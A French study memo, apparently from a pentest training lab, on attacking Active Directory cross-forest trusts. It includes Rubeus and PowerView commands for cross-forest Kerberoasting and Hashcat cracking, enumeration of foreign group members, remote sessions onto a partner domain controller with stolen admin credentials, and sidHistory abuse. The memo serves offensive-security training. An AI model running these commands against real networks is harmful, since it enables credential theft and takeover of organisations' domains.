# Mémo — Attacking Domain Trusts : Cross-Forest (depuis Windows)

> **Contexte** : trust **inter-forêts** (external ou forest trust), souvent **bidirectionnel**. Même si on ne peut pas escalader dans la forêt courante, on peut parfois récupérer un ticket / cracker un hash d'un compte **Domain/Enterprise Admin** de l'**autre forêt**.
> Lab : forêt `INLANEFREIGHT.LOCAL` ⇄ forêt `FREIGHTLOGISTICS.LOCAL` (external bidirectional forest trust).
> ⚠️ Faisabilité dépend de la **direction du trust** : il faut un trust **inbound** ou **bidirectionnel** vers la forêt cible.

---

## 1. Cross-Forest Kerberoasting

Kerberoasting (et ASREPRoasting) peut se faire **à travers un trust**. On énumère les comptes à SPN dans la forêt cible, on roast, on crack hors-ligne → si le compte est privilégié dans les 2 domaines, c'est un full admin.

```powershell
# a) Comptes avec SPN dans la forêt cible
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
#   → krbtgt, mssqlsvc

# b) Vérifier si le compte est privilégié dans la forêt cible
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
#   → memberof = CN=Domain Admins,...,DC=FREIGHTLOGISTICS,DC=LOCAL  (jackpot)
```

**Roast à travers le trust avec Rubeus** (flag `/domain:` = forêt cible) :
```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
#   → $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01...*$<SNIP>
```
> `Supported ETypes : RC4_HMAC_DEFAULT` → hash RC4 → crackable Hashcat `-m 13100`.
> Si le compte est en AES, forcer RC4 avec `/tgtdeleg` (ou `/ticket:X`).

Puis crack offline (Hashcat). Cracké = contrôle total des **deux** domaines en abusant simplement de la direction d'authentification du trust bidirectionnel.

## 2. Réutilisation de mot de passe & appartenance de groupe

Sur un **forest trust bidirectionnel géré par les mêmes admins**, deux pistes classiques après avoir compromis la forêt A :

### a) Password re-use entre forêts
Si on obtient le mot de passe clair / NT hash d'un compte privilégié de la forêt A (`Administrator` built-in, Domain/Enterprise Admins) et que la forêt B a un compte **admin au nom similaire**, tester la **réutilisation de mot de passe**.
> Ex. vu en vrai : `adm_bob.smith` (DA forêt A) vs `bsmith_admin` (forêt B) avec le même mot de passe → owning A = owning B instantanément.

### b) Foreign group membership
Un admin de la forêt A peut être **membre d'un groupe** de la forêt B.
⚠️ Seuls les **Domain Local Groups** acceptent des security principals d'une **autre forêt** → typiquement un DA/EA de A dans le groupe built-in **Administrators** de B.

```powershell
# Énumérer les groupes avec des membres "étrangers" (foreign group membership)
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
#   GroupName   : Administrators  (CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL)
#   MemberName  : S-1-5-21-3842939050-3880317879-2865463114-500  (ForeignSecurityPrincipals)

# Résoudre le SID du membre étranger
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
#   → INLANEFREIGHT\administrator   (RID 500 = Administrator built-in forêt A)
```

**Exploiter l'accès** (l'Administrator de A est admin sur le DC de B) :
```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
#   whoami → inlanefreight\administrator  (sur le DC de la forêt B via WinRM)
```
> Quick win à toujours tester si un forest trust bidirectionnel est présent **et que la 2e forêt est dans le scope**.

## 3. SID History Abuse — cross-forest

SID History peut aussi s'abuser **à travers un forest trust**.
- Lors d'une **migration** d'un user d'une forêt à l'autre, si **SID Filtering n'est pas activé**, on peut ajouter un SID de l'autre forêt → ce SID est ajouté au **token** à l'auth cross-forest.
- Si le SID d'un compte **admin de la forêt A** est mis dans le `sidHistory` d'un compte de la forêt B (qui peut s'authentifier cross-forest) → ce compte a les droits admin en accédant aux ressources de la forêt partenaire.
- Ex. : `jjones` migré de `INLANEFREIGHT.LOCAL` vers `CORP.LOCAL` (forêt différente) ; sans SID Filtering, il conserve ses droits/ACE/accès partages dans INLANEFREIGHT.LOCAL tout en étant membre de CORP.LOCAL.

> Différence clé avec le child→parent (cf. [memo-trust-child-parent-windows.md](memo-trust-child-parent-windows.md)) : **inter-forêts**, le **SID Filtering** EST normalement une protection active → l'abus suppose qu'il a été **désactivé** (souvent le cas lors des migrations M&A).

---

## 4. À retenir

| Technique | Commande / outil clé |
|-----------|----------------------|
| Énum SPN forêt cible | `Get-DomainUser -SPN -Domain <forêt>` |
| Vérif privilèges du compte | `Get-DomainUser -Domain <forêt> -Identity <user> \| select memberof` |
| Cross-forest Kerberoast | `Rubeus.exe kerberoast /domain:<forêt> /user:<user> /nowrap` → Hashcat `-m 13100` |
| Foreign group membership | `Get-DomainForeignGroupMember -Domain <forêt>` + `Convert-SidToName <SID>` |
| Exploiter l'accès | `Enter-PSSession -ComputerName <DC forêt B> -Credential <forêt A>\administrator` |
| SID History cross-forest | injection du SID admin forêt A dans `sidHistory` d'un compte forêt B (si SID Filtering off) |

**Pré-requis** : trust **inbound/bidirectionnel** vers la forêt cible. **Points d'attention** : password re-use (comptes admins au nom proche), Domain Local Groups = seuls à accepter des principals hors-forêt, SID Filtering souvent désactivé en contexte M&A.
